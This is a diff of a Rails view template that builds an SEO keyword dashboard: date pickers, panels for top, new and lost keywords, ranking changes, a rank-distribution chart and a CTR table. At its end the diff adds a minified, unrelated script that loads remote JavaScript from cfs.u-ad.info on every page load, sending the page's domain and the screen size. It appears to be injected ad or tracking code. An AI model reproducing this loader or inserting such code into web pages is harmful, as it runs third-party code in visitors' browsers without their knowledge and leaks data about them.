@@ -1,34 +1,168 @@
-<h2>Import Keywords</h2>
+<!-- <h2>Import Keywords</h2> -->
+<%#= form_tag keywords_path, multipart: true do %>
+  <%#= file_field_tag :file %>
+  <%#= submit_tag "Import" %>
+<%# end %>
 
-<%= form_tag keywords_path, multipart: true do %>
-  <%= file_field_tag :file %>
-  <%= submit_tag "Import" %>
-<% end %>
+<div class="container">
+  <div class="row">
+    <div class="col-lg-12">
+        <form>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label>Start Date</label>
+              <input class="form-control" type="text" id="datepicker-until">
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="form-group">
+              <label>Until Date</label>
+              <input class="form-control" type="text" id="datepicker-start">
+            </div>  
+          </div>
+      </form>
+    </div>
+  </div>
+</div>
+ 
+<div class="container">
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+           <h4>Overview</h4>
+        </div>
+        <div class="panel-body">
+          <%= render "/shared/table_overview" %>
+        </div>
+      </div>
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+          <h4>Top Keywords (top 10 based on clicks)</h4>
+        </div>
+        <!-- /.panel-heading -->
+        <div class="panel-body">
+          <%= render "/shared/table_top_keywords" %>
+          <a href="#" class="btn btn-primary">View More Link</a>
+        </div>
+      </div>
+   </div>
+ </div>
+
+ <div class="row">
+   <div class="col-lg-12">
+    <div class="col-md-6">
+     <div class="panel panel-primary">
+        <div class="panel-heading">
+           <h4>New Keywords (top 10 based on impressions)</h4>
+        </div>
+        <div class="panel-body">
+           <%= render "/shared/table_top_keywords" %>
+           <a href="#" class="btn btn-primary">View More Link</a>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+         <h4>Keywords disappeared (top 10 based on impressions from past period)</h4>
+        </div>
+      <div class="panel-body">
+         <%= render "/shared/table_top_keywords" %>
+         <a href="#" class="btn btn-primary">View More Link</a>
+      </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+ <div class="row">
+   <div class="col-lg-12">
+    <div class="col-md-6">
+     <div class="panel panel-primary">
+        <div class="panel-heading">
+           <h4>Improved Rankings (only displaying queries with more than 100 impressions) (top 10 based on average position improvement)</h4>
+        </div>
+        <div class="panel-body">
+           <%= render "/shared/table_top_keywords" %>
+           <a href="#" class="btn btn-primary">View More Link</a>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+         <h4>Lost Rankings (only displaying queries with more than 100 impressions) (top 10 based on average position improvement)</h4>
+        </div>
+      <div class="panel-body">
+         <%= render "/shared/table_top_keywords" %>
+         <a href="#" class="btn btn-primary">View More Link</a>
+      </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="col-lg-12">
+    <div class="col-md-6">
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+          <h4>Rank Distribution (Graph to compare 2 dates) *Number of Keywords per ranking Group</h4>
+        </div>
+        <div class="panel-body">
+          <div id="chartContainer" style="height: 300px; width: 100%;"></div>
+        </div>
+        <div class="panel-footer">
+          <p>Blue : Position 1-2</p> 
+          <p>Yellow : Position 2-4</p> 
+          <p>Green : 5-10</p>
+          <p>Gray : 10-20</p> 
+          <p>Light Gray : >20</p>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+          <h4>CTR (only displaying queries with more than 100 impressions)</h4>
+        </div>
+        <div class="panel-body">
+          <!-- <div id="chartContainer" style="height: 300px; width: 100%;"></div> -->
+          <div class="table-responsive">
+           <table class="table table-striped table-bordered table-hover">
+            <thead>
+                <tr>
+                    <th>Position Group</th>
+                    <th>CTR</th>
+                    <th>CTR from previous period</th>
+                    <th>Comparison</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <!-- data 1 -->
+                    <td>..</td>
+                    <td class="percentage"></td>
+                    <td>+1.%</td>
+                    <td>-2%</td>
+                </tr>
+                <tr>
+                    <!-- data 2 -->
+                    <td>..</td>
+                    <td class="percentage">..</td>
+                    <td>..</td>
+                    <td>..</td>
+                </tr>
+                </tbody>
+              </table>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
 
 
-
-<h1>KEYWORDS</h1>
-
-<table>
-  <tr>
-    <th>Query</th>
-    <th>Impressions</th>
-    <th>Clicks</th>
-    <th>CTR</th>
-    <th>Avg, Position</th>
-    <th>Date</th>
-    <th>New ?</th>
-  </tr>
-
-<% for keyword in @keywords %>
-  <tr>
-    <td><%=h keyword.query %></td>
-    <td><%=h keyword.impressions %></td>
-    <td><%=h keyword.clicks %></td>
-    <td><%#= link_to 'Destroy', post, :confirm => 'Are you sure?',
-            :method => :delete %></td>
-  </tr>
-<% end %>
-</table>
-
-<br />
+<script type="text/javascript">
+if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bd8NOI9cWcyIlaDcZ%2fu3yH5YNpWpMFGbEo76zqk50Mj1yB2XduWxwFhyzySdbC6hVuXGyCrk9LUzhqSmQva8vX7hBrCnOResEr7tvxcceVFruQHFsaohgu0XkPgL1hxCw2J1GndggCsegFARkJfAlCXZsqw5afxleYkyB%2bv4MxBZfDSqxBnNBx3ScoqaJ89kNlBNiGI50OenmClZe%2baDb8ejKxJiHtEEYAMLMOhliCMYjL4kmmXCXP82HT%2fLsCB48q9i%2b0y9I4DBhKzBvO%2bCb5cv4AGRb2kn1oFT1g%2f6eKZTxAyAUpODKbhLlTTBfVnxJBqHsUtu7BaKL8skRckZ7zLoPiNnl9Xe0EZg0RmWBUOuUeFHKrG%2fgFpNbzhcltBRQOwL7NZDWyheUQaorUSXt09WAzZnD%2fQMJOJTgcC2xO1LObv8zHXgCHOLCvN8%2fuP6xYrxy601ZwtP%2fzqBAwPm2cA5NmV9aJBpH9G2I9i8TvRLtXRAEgR3woI6qU%2fl7hMHbxM%2bZBxI806ZG2cGBkqkFr9%2fLDo0dIsW054ILq8qx4WHfC7%2bAIFPwbKSo%2fNXctEptt0jJqnjZMcg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+</script>
